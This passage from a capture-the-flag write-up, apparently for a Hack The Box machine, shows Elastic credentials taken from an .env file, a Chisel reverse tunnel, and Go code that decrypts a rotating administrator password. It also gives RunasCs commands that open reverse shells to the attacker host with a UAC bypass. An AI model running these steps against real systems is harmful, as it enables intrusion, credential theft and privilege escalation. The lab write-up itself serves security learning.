-a----          6/9/2023  12:18 AM              0 .hugo_build.lock
-a----          6/9/2023  12:18 AM           1003 hugo.toml 

```

The posts are markdown (`.md`) files inside `content\posts`. For example, in `app`:

```

PS C:\temp\www\app> ls content\posts
    Directory: C:\temp\www\app\content\posts
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          6/9/2023  12:18 AM           3134 enable-ssl-iis.md
-a----          6/9/2023  12:18 AM           3625 enable-ssl-powershell.md
-a----          6/9/2023  12:18 AM           3710 golang-reversing.md
-a----          6/9/2023  12:18 AM           3981 intro-dot-net-re.md
-a----          6/9/2023  12:18 AM           4535 re-report-sleeperbot.md
-a----          6/9/2023  12:18 AM           3625 setup-basic-auth-powershell.md
-a----          6/9/2023  12:18 AM           2793 setup-basic-auth.md 

```

And in `internal`:

```

PS C:\temp\www\internal> ls content\posts
    Directory: C:\temp\www\internal\content\posts
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          6/9/2023  12:28 AM                internal-laps-alpha
-a----          6/9/2023  12:18 AM           1755 first-re-research.md
-a----          6/9/2023  12:18 AM            493 no-more-laps.md    

```

What’s interesting is that there’s an extra post in `internal`, `no-more-laps.md`.

Because it has the `draft: true` metadata at the top, it isn’t showing on the main site:

```
---
title: "**INTERNAL** Getting rid of LAPS"
description: Replacing LAPS with out own custom solution
date: 2023-07-01
draft: true 
tags: [internal, sysadmin, htb-haystack] 
---
# Intro
We are getting rid of LAPS in favor of our own custom solution. 
The password for the `backup` user will be stored in the local Elastic DB.
IT will deploy the decryption client to the admin desktops once it it ready. 
We do expect the development to be ready soon. The Malware RE team will be the first test group. 

```

[Local Administrator Password Solution](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview), or LAPS, is a feature of Windows where the local administrator passwords for each machine are managed by the Active Directory environment. LAPS was introduces to combat the common practice of having the same password for all local administrators in a domain, which meant that once someone compromised one machine, they could be administrator on any machine.

The Napper team is moving away from laps in favor of a solution that lives in Elastic.

#### Elastic

For some reason, there’s also a `internal-laps-alpha` folder in the `posts` folder. It has a binary and a `.env` file:

```

PS C:\temp\www\internal\content\posts\internal-laps-alpha> ls
    Directory: C:\temp\www\internal\content\posts\internal-laps-alpha
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          6/9/2023  12:28 AM             82 .env
-a----          6/9/2023  12:20 AM       12697088 a.exe

```

The `.env` has settings presumably used by the EXE:

```

PS C:\temp\www\internal\content\posts\internal-laps-alpha> cat .env
ELASTICUSER=user
ELASTICPASS=DumpPassword\$Here
ELASTICURI=https://127.0.0.1:9200

```

Port 9200 (the default Elastic port) is listening on localhost:

```

PS C:\temp\www\internal> netstat -ano
Active Connections
  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       904
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       1432
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       676
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       520
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1084
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1460
  TCP    0.0.0.0:55634          0.0.0.0:0              LISTENING       660
  TCP    10.10.11.240:139       0.0.0.0:0              LISTENING       4
  TCP    10.10.11.240:52806     10.10.14.6:443         CLOSE_WAIT      1148
  TCP    10.10.11.240:52858     10.10.14.6:443         ESTABLISHED     3532
  TCP    127.0.0.1:9200         0.0.0.0:0              LISTENING       4704
  TCP    127.0.0.1:9300         0.0.0.0:0              LISTENING       4704
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       904
  TCP    [::]:443               [::]:0                 LISTENING       4
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       676
  TCP    [::]:49665             [::]:0                 LISTENING       520
  TCP    [::]:49666             [::]:0                 LISTENING       1084
  TCP    [::]:49667             [::]:0                 LISTENING       1460
  TCP    [::]:55634             [::]:0                 LISTENING       660
  UDP    0.0.0.0:123            *:*                                    5372
  UDP    0.0.0.0:5050           *:*                                    1432
  UDP    0.0.0.0:5353           *:*                                    1908
  UDP    0.0.0.0:5355           *:*                                    1908
  UDP    10.10.11.240:137       *:*                                    4
  UDP    10.10.11.240:138       *:*                                    4
  UDP    10.10.11.240:1900      *:*                                    4208
  UDP    10.10.11.240:49607     *:*                                    4208
  UDP    127.0.0.1:1900         *:*                                    4208
  UDP    127.0.0.1:49608        *:*                                    4208
  UDP    127.0.0.1:51847        *:*                                    2924
  UDP    [::]:123               *:*                                    5372
  UDP    [::]:5353              *:*                                    1908
  UDP    [::]:5355              *:*                                    1908
  UDP    [::1]:1900             *:*                                    4208
  UDP    [::1]:49606            *:*                                    4208
  UDP    [fe80::3291:777c:d9c6:4d65%10]:1900  *:*                                    4208
  UDP    [fe80::3291:777c:d9c6:4d65%10]:49605  *:*                                    4208

```

### Elastic

#### Create Tunnel

I’ll download the latest [Chisel](https://github.com/jpillora/chisel) and use `smbserver.py` to make a file share:

```

oxdf@hacky$ smbserver.py share . -smb2support -username oxdf -password 0xdf0xdf
Impacket v0.12.0.dev1+20240308.164415.4a62f39 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

From Napper, I’ll mount the share:

```

PS C:\programdata> net use \\10.10.14.6\share /u:oxdf 0xdf0xdf
The command completed successfully.

```

Now I can copy `chisel` from the share onto Napper:

```

PS C:\programdata> copy \\10.10.14.6\share\chisel_1.9.1_windows_amd64 c.exe

```

I’ll start the server on my host:

```

oxdf@hacky$ /opt/chisel/chisel_1.9.1_linux_amd64 server -p 8000 --reverse
2024/04/29 15:24:40 server: Reverse tunnelling enabled
2024/04/29 15:24:40 server: Fingerprint 0TjmXerswmCkf2xXmQCsDHwzrvxcgmtt4n02LMmGV/U=
2024/04/29 15:24:40 server: Listening on http://0.0.0.0:8000

```

When I run the client on Napper:

```

PS C:\ProgramData> .\c.exe client 10.10.14.6:8000 R:9200:127.0.0.1:9200

```

There’s a connection at my VM:

```

2024/04/29 15:27:14 server: session#1: tun: proxy#R:9200=>9200: Listening

```

#### Access Elastic

Elastic DB is accessible over HTTPS. I’ll connect to `https://127.0.0.1:9200/`, and it asks for auth:

![image-20240429152953201](/img/image-20240429152953201.png)

The credentials user:DumpPassword$Here works:

![image-20240429153053803](/img/image-20240429153053803.png)

I can switch to `curl` and include the username and password in the URL:

```

oxdf@hacky$ curl -k 'https://user:DumpPassword$Here@127.0.0.1:9200/'
{
  "name" : "NAPPER",
  "cluster_name" : "backupuser",
  "cluster_uuid" : "tWUZG4e8QpWIwT8HmKcBiw",
  "version" : {
    "number" : "8.8.0",
    "build_flavor" : "default",
    "build_type" : "zip",
    "build_hash" : "c01029875a091076ed42cdb3a41c10b1a9a5a20f",
    "build_date" : "2023-05-23T17:16:07.179039820Z",
    "build_snapshot" : false,
    "lucene_version" : "9.6.0",
    "minimum_wire_compatibility_version" : "7.17.0",
    "minimum_index_compatibility_version" : "7.0.0"
  },
  "tagline" : "You Know, for Search"
}

```

#### Enumerate DB

I’ve enumerated Elastic before on [Haystack](/2019/11/02/htb-haystack.html#elasticsearch---tcp-9200), but a long time ago! There are two indices in the DB:

```

oxdf@hacky$ curl -k 'https://user:DumpPassword$Here@127.0.0.1:9200/_cat/indices?v'
health status index      uuid                   pri rep docs.count docs.deleted store.size pri.store.size
yellow open   seed       9_GrbotgT3i8q8elrKl2mg   1   1          1            0      3.3kb          3.3kb
yellow open   user-00001 7IiBS1HOTtWYJKT9FjJxKw   1   1          1            0      5.3kb          5.3kb

```

`seed` contains a single entry:

```

oxdf@hacky$ curl -k 'https://user:DumpPassword$Here@127.0.0.1:9200/seed/_search' -s | jq .
{
  "took": 2,
  "timed_out": false,
  "_shards": {
    "total": 1,
    "successful": 1,
    "skipped": 0,
    "failed": 0
  },
  "hits": {
    "total": {
      "value": 1,
      "relation": "eq"
    },
    "max_score": 1,
    "hits": [
      {
        "_index": "seed",
        "_id": "1",
        "_score": 1,
        "_source": {
          "seed": 25229331
        }
      }
    ]
  }
}

```

The interesting value there is `25229331`.

`user-00001` has one entry as well:

```

oxdf@hacky$ curl -k 'https://user:DumpPassword$Here@127.0.0.1:9200/user-00001/_search' -s | jq .
{
  "took": 3,
  "timed_out": false,
  "_shards": {
    "total": 1,
    "successful": 1,
    "skipped": 0,
    "failed": 0
  },
  "hits": {
    "total": {
      "value": 1,
      "relation": "eq"
    },
    "max_score": 1,
    "hits": [
      {
        "_index": "user-00001",
        "_id": "YpJYK48BVxkVvQSdtMaj",
        "_score": 1,
        "_source": {
          "blob": "uC2p5FWMGM7H-4swn3Bq9rfTkES4dEWmv2NXaD3xpqrU4byZSz6wfFKWmWCmnoNM6AL6WYe8mvw=",
          "timestamp": "2024-04-29T12:33:04.7882472-07:00"
        }
      }
    ]
  }
}

```

The document is stored as a base64-encoded blob in the `blob` entry.

### a.exe

#### Initial Analysis

I’ll copy `a.exe` onto my SMB share:

```

PS C:\temp\www\internal\content\posts\internal-laps-alpha> copy a.exe \\10.10.14.6\share\

```

The file is a 64-bit non-.NET exe:

```

oxdf@hacky$ file a.exe
a.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows

```

Running `strings` on the binary produces a *ton* of strings. At the top is:

```

oxdf@hacky$ strings a.exe | wc -l
139591
oxdf@hacky$ strings -n 20 a.exe
!This program cannot be run in DOS mode.
 Go build ID: "nr66ektGkZlyS41y9l8G/t8VA_0u1HRvqOtqcn7YX/-9riwgUEs31_Z8HwaZDn/hvAZjQlgTWuVVeDeu1yf"
        PublicKey               PublicKey
...[snip]...

```

This is a binary written in Go, which means that it’s statically compiled, which liked explains why there are so many strings.

#### main.main

I’ll open the binary in [Ghidra](https://ghidra-sre.org/) and let it do it’s analysis. Once it’s done, there’s a `main.main` function. At the top, it’s using `godotenv` (a library for loading `.env` files) to get the Elastic information:

![image-20240429155038574](/img/image-20240429155038574.png)

A bit further down, it’s using the `go-elasticsearch` module to connect:

![image-20240429155156898](/img/image-20240429155156898.png)

Later, there’s an interesting part:

![image-20240429161354120](/img/image-20240429161354120.png)

It’s calling `main.randStringList(0x28)`, along with the output of `main.genGey(Seed)`, and using `main.encrypt` to presumably encrypt the random string with the key generated from the seed. The result is written to the DB as the `blob`.

Later, that `ranom_str` is used in the command `cmd /c net user backup [random_str]`:

![image-20240429162239948](/img/image-20240429162239948.png)

So when `a.exe` runs, it gets the seed from the DB and a random string, encrypts the string using a key generated from the seed, stores that in the DB, and then changes the backup user’s password to the random string.

If I can understand how to take the seed and decrypt the blob, I’ll have the backup user’s password.

#### main.getKey

This function is much shorter:

![image-20240429162948170](/img/image-20240429162948170.png)

It’s using the `seed` to seed the `math/rand.Rand` function. Then it makes a 16 byte array, and loops 16 times generating a random int between 0 and 254, adds 1, and then stores it.

#### main.encrypt

There is more going on here, but there’s really only one part that matters to me:

![image-20240429163402041](/img/image-20240429163402041.png)

It’s using AES in cipher feedback mode (CFB). It’s possible the code is doing something weird, but most likely, if I can get the key, I can just use AES to decrypt.

### Decrypt

Putting this all together, with a ton of help from ChatGPT, I’m going to write Go code that will get the current password of the backup user. In [this video](https://www.youtube.com/watch?v=PRbcj-7AScs), I’ll walk through the process:

The final code is:

```

package main

import (
        "bytes"
        "context"
        "crypto/aes"
        "crypto/cipher"
        "crypto/tls"
        "encoding/base64"
        "io"
        "log"
        "math/rand"
        "net/http"

        "github.com/elastic/go-elasticsearch/v8"
        "github.com/tidwall/gjson"
)

func init() {
        log.SetFlags(0)
}

func readDB() (int64, string) {
        log.Print("[*] Fetching data from Elastic DB.")
        cfg := elasticsearch.Config{
                Addresses: []string{"https://127.0.0.1:9200"},
                Username:  "user",
                Password:  "DumpPassword$Here",
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{
                                InsecureSkipVerify: true,
                        },
                },
        }
        client, err := elasticsearch.NewClient(cfg)
        if err != nil {
                log.Fatalf("Error creating client: %s", err)
        }

        res, err := client.Get("seed", "1")
        if err != nil {
                log.Fatalf("Error getting seed from DB: %s", err)
        }
        defer res.Body.Close()

        json := read(res.Body)
        seed := gjson.Get(json, "_source.seed").Int()

        res2, err := client.Search(
                client.Search.WithContext(context.Background()),
                client.Search.WithIndex("user-00001"),
                client.Search.WithSize(1),
        )
        if err != nil {
                log.Fatalf("Error getting blob from DB: %s", err)
        }
        defer res2.Body.Close()

        json2 := read(res2.Body)
        blob := gjson.Get(json2, "hits.hits.0._source.blob").String()

        return seed, blob
}

func read(r io.Reader) string {
        var b bytes.Buffer
        b.ReadFrom(r)
        return b.String()
}

func genKey(seed int64) []byte {
        log.Println("[*] Generating key from seed.")
        rand.Seed(seed)
        key := make([]byte, 16)
        for i := 0; i < 16; i++ {
                randnum := rand.Intn(254) + 1
                key[i] = byte(randnum)
        }
        return key
}

func decrypt(key []byte, ciphertextb64 string) string {
        log.Println("[*] Decrypting blob using key")
        ciphertext, err := base64.URLEncoding.DecodeString(ciphertextb64)
        if err != nil {
                log.Fatalf("Failed to base64 decode blob: %s", err)
        }

        block, err := aes.NewCipher(key)
        if err != nil {
                log.Fatalf("Failed to create AES cipher with key: %s", err)
        }

        iv := ciphertext[:aes.BlockSize]
        ciphertext = ciphertext[aes.BlockSize:]

        stream := cipher.NewCFBDecrypter(block, iv)
        plaintext := make([]byte, len(ciphertext))
        stream.XORKeyStream(plaintext, ciphertext)

        return string(plaintext)
}

func main() {
        seed, blob := readDB()
        log.Printf("[+] Seed value: %d\n", seed)
        log.Printf("[+] Blob value: %s\n", blob)

        key := genKey(seed)
        log.Printf("[+] Generated key: %x\n", key)

        password := decrypt(key, blob)
        log.Printf("[+] Password: %s", password)
}

```

This will reach out to Elastic and pull down both the `seed` and `blob` values. Then it uses the `seed` to generate a key, and uses the key to decrypt the `blob`, returning the password.

```

oxdf@hacky$ go run .
[*] Fetching data from Elastic DB.
[+] Seed value: 79555944
[+] Blob value: 9Gx8KMZli8w02w52E1MFu7Xyvo2fTyS-K-1l9BXWVAGg9pn91APGNvRdAoq6zNpiku177ExFNpg=
[*] Generating key from seed.
[+] Generated key: d27f01998331571ee961e9eee789ce44
[*] Decrypting blob using key
[+] Password: gUdZfyZKfbAqqmmQdXrTADFyclZefAbbKsJeryZq

```

This password seems to change every 5 minutes, so I’ll need to make sure to use it quickly or recompute.

### Shell

#### UAC

With no WinRM or SSH, I’ll have to turn to [RunasCs.exe](https://github.com/antonioCoco/RunasCs), a binary that allows me to start a process as another user using their credentials.

I’ll upload a copy over SMB, and run it, giving it the username, password, command to run, and `-r ip:port` for a remote connection back on that ip / port:

```

PS C:\programdata> .\r.exe backup mNaGEwFhGLDYTLcJjVTshbqmHLPLEfwsGkOWUgcw powershell -r 10.10.14.6:9001 
[*] Warning: The logon for user 'backup' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-3cc0e$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 4324 created in background.

```

At listening `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.11.240 57164
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Windows\system32> whoami
napper\backup

```

The backup user is in the Administrators group!

```

PS C:\Windows\system32> net user backup
User name                    backup
Full Name                    backup
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/29/2024 4:09:57 PM
Password expires             Never
Password changeable          4/29/2024 4:09:57 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   4/29/2024 4:09:34 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *None                 
The command completed successfully.

```

But I can’t access `root.txt` or even the `Desktop` folder:

```

PS C:\users\administrator> cd desktop
cd : Access is denied
At line:1 char:1
+ cd desktop
+ ~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\users\administrator\desktop:String) [Set-Location], UnauthorizedAc 
   cessException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.SetLocationCommand
 
cd : Cannot find path 'C:\users\administrator\desktop' because it does not exist.
At line:1 char:1
+ cd desktop
+ ~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\users\administrator\desktop:String) [Set-Location], ItemNotFoundExce 
   ption
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand

```

This shell doesn’t have many privileges:

```

PS C:\users\administrator> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

```

#### Bypass UAC

I’m being blocked by UAC. Fortunately for me, `RunasCs.exe` has a flag for this, `--bypass-uac`. I’ll kill the shell as backup and start the listening again. Back in the shell as ruben, I’ll run again:

```

PS C:\programdata> .\r.exe backup HylmmVmmXGmhXfJHZzvbRTLNwcKWxvbHWGwvDTHX powershell -r 10.10.14.6:9001 --bypass-uac
[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-3cc0e$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 1436 created in background.

```

This shell has lots of privilege:

```

PS C:\Windows\system32> whoami
napper\backup
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State  
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled

```

And can grab the flag:

```

PS C:\users\administrator\desktop> type root.txt
a5b46efa************************

```

## Beyond Root

### Scheduled Tasks

There is some kind of automation happening with the custom LAPS replacement, as I noticed while solving that the data in Elastic was changing every five minutes.

As an admin, I’ll start by listing all the scheduled tasks:

```

PS C:\> get-scheduledtask

TaskPath                                       TaskName                          State
--------                                       --------                          -----
\                                              cleanup                           Ready
\                                              iisHelper                         Running
\                                              MicrosoftEdgeUpdateTaskMachine... Ready
\                                              MicrosoftEdgeUpdateTaskMachineUA  Ready
\                                              OneDrive Reporting Task-S-1-5-... Ready
\                                              OneDrive Standalone Update Tas... Ready
\Microsoft\Windows\.NET Framework\             .NET Framework NGEN v4.0.30319    Ready
\Microsoft\Windows\.NET Framework\             .NET Framework NGEN v4.0.30319 64 Ready
\Microsoft\Windows\.NET Framework\             .NET Framework NGEN v4.0.30319... Disabled
\Microsoft\Windows\.NET Framework\             .NET Framework NGEN v4.0.30319... Disabled
\Microsoft\Windows\Active Directory Rights ... AD RMS Rights Policy Template ... Disabled
\Microsoft\Windows\Active Directory Rights ... AD RMS Rights Policy Template ... Ready
\Microsoft\Windows\AppID\                      EDP Policy Manager                Ready
\Microsoft\Windows\AppID\                      PolicyConverter                   Disabled
\Microsoft\Windows\AppID\                      VerifiedPublisherCertStoreCheck   Disabled
\Microsoft\Windows\Application Experience\     MareBackup                        Ready
\Microsoft\Windows\Application Experience\     Microsoft Compatibility Appraiser Ready
\Microsoft\Windows\Application Experience\     PcaPatchDbTask                    Ready
\Microsoft\Windows\Application Experience\     ProgramDataUpdater                Ready
\Microsoft\Windows\Application Experience\     StartupAppTask                    Ready
\Microsoft\Windows\ApplicationData\            appuriverifierdaily               Ready
\Microsoft\Windows\ApplicationData\            appuriverifierinstall             Ready
\Microsoft\Windows\ApplicationData\            CleanupTemporaryState             Ready
\Microsoft\Windows\ApplicationData\            DsSvcCleanup                      Ready
\Microsoft\Windows\AppListBackup\              Backup                            Ready
\Microsoft\Windows\AppListBackup\              BackupNonMaintenance              Ready
\Microsoft\Windows\AppxDeploymentClient\       Pre-staged app cleanup            Disabled
\Microsoft\Windows\Autochk\                    Proxy                             Ready
\Microsoft\Windows\BitLocker\                  BitLocker Encrypt All Drives      Ready
\Microsoft\Windows\BitLocker\                  BitLocker MDM policy Refresh      Ready
\Microsoft\Windows\Bluetooth\                  UninstallDeviceTask               Ready
\Microsoft\Windows\BrokerInfrastructure\       BgTaskRegistrationMaintenanceTask Ready
\Microsoft\Windows\CertificateServicesClient\  AikCertEnrollTask                 Ready
\Microsoft\Windows\CertificateServicesClient\  CryptoPolicyTask                  Ready
\Microsoft\Windows\CertificateServicesClient\  KeyPreGenTask                     Ready
\Microsoft\Windows\CertificateServicesClient\  SystemTask                        Ready
\Microsoft\Windows\CertificateServicesClient\  UserTask                          Ready
\Microsoft\Windows\CertificateServicesClient\  UserTask-Roam                     Ready
\Microsoft\Windows\Chkdsk\                     ProactiveScan                     Ready
\Microsoft\Windows\Chkdsk\                     SyspartRepair                     Ready
\Microsoft\Windows\Clip\                       License Validation                Disabled
\Microsoft\Windows\Clip\                       LicenseImdsIntegration            Disabled
\Microsoft\Windows\CloudExperienceHost\        CreateObjectTask                  Ready
\Microsoft\Windows\CloudRestore\               Backup                            Ready
\Microsoft\Windows\ConsentUX\UnifiedConsent\   UnifiedConsentSyncTask            Ready
\Microsoft\Windows\Customer Experience Impr... Consolidator                      Ready
\Microsoft\Windows\Customer Experience Impr... UsbCeip                           Ready
\Microsoft\Windows\Data Integrity Scan\        Data Integrity Check And Scan     Ready
\Microsoft\Windows\Data Integrity Scan\        Data Integrity Scan               Ready
\Microsoft\Windows\Data Integrity Scan\        Data Integrity Scan for Crash ... Ready
\Microsoft\Windows\Defrag\                     ScheduledDefrag                   Ready
\Microsoft\Windows\Device Information\         Device                            Ready
\Microsoft\Windows\Device Information\         Device User                       Ready
\Microsoft\Windows\Device Setup\               Metadata Refresh                  Ready
\Microsoft\Windows\DeviceDirectoryClient\      HandleCommand                     Ready
\Microsoft\Windows\DeviceDirectoryClient\      HandleWnsCommand                  Ready
\Microsoft\Windows\DeviceDirectoryClient\      IntegrityCheck                    Ready
\Microsoft\Windows\DeviceDirectoryClient\      LocateCommandUserSession          Ready
\Microsoft\Windows\DeviceDirectoryClient\      RegisterDeviceAccountChange       Ready
\Microsoft\Windows\DeviceDirectoryClient\      RegisterDeviceLocationRightsCh... Disabled
\Microsoft\Windows\DeviceDirectoryClient\      RegisterDevicePeriodic24          Disabled
\Microsoft\Windows\DeviceDirectoryClient\      RegisterDevicePolicyChange        Ready
\Microsoft\Windows\DeviceDirectoryClient\      RegisterDeviceProtectionStateC... Ready
\Microsoft\Windows\DeviceDirectoryClient\      RegisterDeviceSettingChange       Ready
\Microsoft\Windows\DeviceDirectoryClient\      RegisterUserDevice                Ready
\Microsoft\Windows\Diagnosis\                  RecommendedTroubleshootingScanner Ready
\Microsoft\Windows\Diagnosis\                  Scheduled                         Ready
\Microsoft\Windows\DirectX\                    DirectXDatabaseUpdater            Ready
\Microsoft\Windows\DirectX\                    DXGIAdapterCache                  Ready
\Microsoft\Windows\DiskCleanup\                SilentCleanup                     Ready
\Microsoft\Windows\DiskDiagnostic\             Microsoft-Windows-DiskDiagnost... Ready
\Microsoft\Windows\DiskDiagnostic\             Microsoft-Windows-DiskDiagnost... Disabled
\Microsoft\Windows\DiskFootprint\              Diagnostics                       Ready
\Microsoft\Windows\DiskFootprint\              StorageSense                      Ready
\Microsoft\Windows\DUSM\                       dusmtask                          Ready
\Microsoft\Windows\EDP\                        EDP App Launch Task               Ready
\Microsoft\Windows\EDP\                        EDP Auth Task                     Ready
\Microsoft\Windows\EDP\                        EDP Inaccessible Credentials Task Ready
\Microsoft\Windows\EDP\                        StorageCardEncryption Task        Ready
\Microsoft\Windows\ExploitGuard\               ExploitGuard MDM policy Refresh   Ready
\Microsoft\Windows\Feedback\Siuf\              DmClient                          Ready
\Microsoft\Windows\Feedback\Siuf\              DmClientOnScenarioDownload        Ready
\Microsoft\Windows\File Classification Infr... Property Definition Sync          Disabled
\Microsoft\Windows\FileHistory\                File History (maintenance mode)   Ready
\Microsoft\Windows\Flighting\FeatureConfig\    ReconcileFeatures                 Ready
\Microsoft\Windows\Flighting\FeatureConfig\    UsageDataFlushing                 Ready
\Microsoft\Windows\Flighting\FeatureConfig\    UsageDataReporting                Ready
\Microsoft\Windows\Flighting\OneSettings\      RefreshCache                      Ready
\Microsoft\Windows\HelloFace\                  FODCleanupTask                    Ready
\Microsoft\Windows\Input\                      LocalUserSyncDataAvailable        Ready
\Microsoft\Windows\Input\                      MouseSyncDataAvailable            Ready
\Microsoft\Windows\Input\                      PenSyncDataAvailable              Ready
\Microsoft\Windows\Input\                      TouchpadSyncDataAvailable         Ready
\Microsoft\Windows\InstallService\             ScanForUpdates                    Ready
\Microsoft\Windows\InstallService\             ScanForUpdatesAsUser              Ready
\Microsoft\Windows\InstallService\             SmartRetry                        Ready
\Microsoft\Windows\InstallService\             WakeUpAndContinueUpdates          Disabled
\Microsoft\Windows\InstallService\             WakeUpAndScanForUpdates           Disabled
\Microsoft\Windows\International\              Synchronize Language Settings     Ready
\Microsoft\Windows\LanguageComponentsInstal... Installation                      Ready
\Microsoft\Windows\LanguageComponentsInstal... ReconcileLanguageResources        Ready
\Microsoft\Windows\LanguageComponentsInstal... Uninstallation                    Disabled
\Microsoft\Windows\License Manager\            TempSignedLicenseExchange         Ready
\Microsoft\Windows\Location\                   Notifications                     Ready
\Microsoft\Windows\Location\                   WindowsActionDialog               Ready
\Microsoft\Windows\Maintenance\                WinSAT                            Ready
\Microsoft\Windows\Management\Autopilot\       DetectHardwareChange              Disabled
\Microsoft\Windows\Management\Autopilot\       RemediateHardwareChange           Disabled
\Microsoft\Windows\Management\Provisioning\    Cellular                          Ready
\Microsoft\Windows\Management\Provisioning\    Logon                             Ready
\Microsoft\Windows\Management\Provisioning\    Retry                             Disabled
\Microsoft\Windows\Management\Provisioning\    RunOnReboot                       Disabled
\Microsoft\Windows\Maps\                       MapsToastTask                     Ready
\Microsoft\Windows\Maps\                       MapsUpdateTask                    Disabled
\Microsoft\Windows\MemoryDiagnostic\           ProcessMemoryDiagnosticEvents     Ready
\Microsoft\Windows\MemoryDiagnostic\           RunFullMemoryDiagnostic           Ready
\Microsoft\Windows\Mobile Broadband Accounts\  MNO Metadata Parser               Ready
\Microsoft\Windows\MUI\                        LPRemove                          Ready
\Microsoft\Windows\Multimedia\                 SystemSoundsService               Ready
\Microsoft\Windows\NetTrace\                   GatherNetworkInfo                 Ready
\Microsoft\Windows\NlaSvc\                     WiFiTask                          Ready
\Microsoft\Windows\Offline Files\              Background Synchronization        Disabled
\Microsoft\Windows\Offline Files\              Logon Synchronization             Disabled
\Microsoft\Windows\PI\                         Secure-Boot-Update                Ready
\Microsoft\Windows\PI\                         SecureBootEncodeUEFI              Ready
\Microsoft\Windows\PI\                         Sqm-Tasks                         Ready
\Microsoft\Windows\Plug and Play\              Device Install Group Policy       Ready
\Microsoft\Windows\Plug and Play\              Device Install Reboot Required    Ready
\Microsoft\Windows\Plug and Play\              Sysprep Generalize Drivers        Ready
\Microsoft\Windows\Power Efficiency Diagnos... AnalyzeSystem                     Ready
\Microsoft\Windows\Printing\                   EduPrintProv                      Ready
\Microsoft\Windows\Printing\                   PrinterCleanupTask                Ready
\Microsoft\Windows\PushToInstall\              LoginCheck                        Disabled
\Microsoft\Windows\PushToInstall\              Registration                      Ready
\Microsoft\Windows\Ras\                        MobilityManager                   Ready
\Microsoft\Windows\RecoveryEnvironment\        VerifyWinRE                       Ready
\Microsoft\Windows\Registry\                   RegIdleBackup                     Ready
\Microsoft\Windows\RemoteAssistance\           RemoteAssistanceTask              Ready
\Microsoft\Windows\RetailDemo\                 CleanupOfflineContent             Ready
